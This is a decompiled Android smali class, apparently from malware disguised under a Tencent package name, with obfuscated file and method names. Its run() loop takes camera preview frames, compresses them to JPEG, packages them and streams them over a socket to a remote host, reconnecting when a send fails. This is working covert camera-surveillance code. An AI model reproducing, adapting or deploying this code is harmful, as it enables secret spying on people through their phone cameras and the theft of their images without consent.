.class Lcom/tencent/SecondaryBackgroundService$3;
.super Ljava/lang/Object;
.source "tunesxconcerningn106.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/SecondaryBackgroundService;->p_tunesxconcerningn106_r()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/SecondaryBackgroundService;


# direct methods
.method constructor <init>(Lcom/tencent/SecondaryBackgroundService;)V
    .locals 0

    .line 273
    iput-object p1, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    .line 276
    iget-object v0, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v0}, Lcom/tencent/SecondaryBackgroundService;->access$300(Lcom/tencent/SecondaryBackgroundService;)[Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x5

    aget-object v0, v0, v1

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    .line 277
    :catch_0
    :goto_0
    iget-object v1, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    iget-boolean v1, v1, Lcom/tencent/SecondaryBackgroundService;->Lo:Z

    if-eqz v1, :cond_2

    const/4 v1, 0x0

    const/4 v2, 0x0

    .line 282
    :try_start_0
    invoke-static {}, Lcom/tencent/SecondaryBackgroundService;->access$100()Ljava/lang/Object;

    move-result-object v3

    monitor-enter v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_4

    .line 283
    :try_start_1
    iget-object v4, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v4}, Lcom/tencent/SecondaryBackgroundService;->access$200(Lcom/tencent/SecondaryBackgroundService;)Ljava/util/List;

    move-result-object v4

    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v4

    if-lez v4, :cond_0

    .line 284
    iget-object v4, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v4}, Lcom/tencent/SecondaryBackgroundService;->access$200(Lcom/tencent/SecondaryBackgroundService;)Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [B
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 285
    :try_start_2
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v2}, Lcom/tencent/SecondaryBackgroundService;->access$200(Lcom/tencent/SecondaryBackgroundService;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v1}, Ljava/util/List;->remove(I)Ljava/lang/Object;
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    move-object v2, v4

    .line 287
    :cond_0
    :try_start_3
    monitor-exit v3
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_2

    :catchall_0
    move-exception v4

    move-object v11, v4

    move-object v4, v2

    move-object v2, v11

    :goto_1
    :try_start_4
    monitor-exit v3
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    :try_start_5
    throw v2
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_4

    :catch_1
    move-object v2, v4

    goto :goto_2

    :catchall_1
    move-exception v2

    goto :goto_1

    :catch_2
    :goto_2
    move-object v4, v2

    .line 298
    :try_start_6
    sget-object v2, Lcom/tencent/SecondaryBackgroundService;->c_tunesxconcerningn106_m:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    .line 299
    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v3

    iget v9, v3, Landroid/hardware/Camera$Size;->width:I

    .line 300
    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v2

    iget v2, v2, Landroid/hardware/Camera$Size;->height:I

    .line 301
    new-instance v10, Landroid/graphics/YuvImage;

    const/16 v5, 0x11

    const/4 v8, 0x0

    move-object v3, v10

    move v6, v9

    move v7, v2

    invoke-direct/range {v3 .. v8}, Landroid/graphics/YuvImage;-><init>([BIII[I)V

    .line 302
    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 303
    new-instance v4, Landroid/graphics/Rect;

    invoke-direct {v4, v1, v1, v9, v2}, Landroid/graphics/Rect;-><init>(IIII)V

    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v2}, Lcom/tencent/SecondaryBackgroundService;->access$400(Lcom/tencent/SecondaryBackgroundService;)I

    move-result v2

    invoke-virtual {v10, v4, v2, v3}, Landroid/graphics/YuvImage;->compressToJpeg(Landroid/graphics/Rect;ILjava/io/OutputStream;)Z

    if-eqz v0, :cond_1

    .line 305
    iget-object v2, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v4

    array-length v4, v4

    const/16 v5, 0x4b

    invoke-static {v2, v4, v5}, Lcom/tencent/SecondaryBackgroundService;->access$500(Lcom/tencent/SecondaryBackgroundService;II)I

    move-result v4

    invoke-static {v2, v4}, Lcom/tencent/SecondaryBackgroundService;->access$402(Lcom/tencent/SecondaryBackgroundService;I)I

    .line 307
    :cond_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v4, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v4}, Lcom/tencent/SecondaryBackgroundService;->access$300(Lcom/tencent/SecondaryBackgroundService;)[Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x3

    aget-object v4, v4, v5

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v4}, Lcom/tencent/SecondaryBackgroundService;->access$300(Lcom/tencent/SecondaryBackgroundService;)[Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x6

    aget-object v4, v4, v5

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-static {v4}, Lcom/tencent/SecondaryBackgroundService;->access$300(Lcom/tencent/SecondaryBackgroundService;)[Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x7

    aget-object v4, v4, v5

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v4

    invoke-static {v2, v4}, Lcom/tencent/DataPackagingEngine;->eliminateicoolerh28(Ljava/lang/String;[B)[B

    move-result-object v2
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_4

    .line 310
    :try_start_7
    sget-object v4, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    array-length v5, v2

    mul-int/lit8 v5, v5, 0xf

    invoke-virtual {v4, v5}, Ljava/net/Socket;->setSendBufferSize(I)V

    .line 311
    sget-object v4, Lcom/tencent/SecondaryBackgroundService;->s_tunesxconcerningn106_k:Ljava/net/Socket;

    invoke-virtual {v4}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v4

    sput-object v4, Lcom/tencent/SecondaryBackgroundService;->o_tunesxconcerningn106_ut:Ljava/io/OutputStream;

    .line 312
    sget-object v4, Lcom/tencent/SecondaryBackgroundService;->o_tunesxconcerningn106_ut:Ljava/io/OutputStream;

    array-length v5, v2

    invoke-virtual {v4, v2, v1, v5}, Ljava/io/OutputStream;->write([BII)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_7 .. :try_end_7} :catch_4

    goto :goto_3

    .line 314
    :catch_3
    :try_start_8
    iget-object v1, p0, Lcom/tencent/SecondaryBackgroundService$3;->this$0:Lcom/tencent/SecondaryBackgroundService;

    invoke-virtual {v1}, Lcom/tencent/SecondaryBackgroundService;->sp()V

    .line 323
    :goto_3
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_8 .. :try_end_8} :catch_4

    :catch_4
    const-wide/16 v1, 0x1

    .line 331
    :try_start_9
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_9
    .catch Ljava/lang/InterruptedException; {:try_start_9 .. :try_end_9} :catch_0

    goto/16 :goto_0

    :cond_2
    return-void
.end method
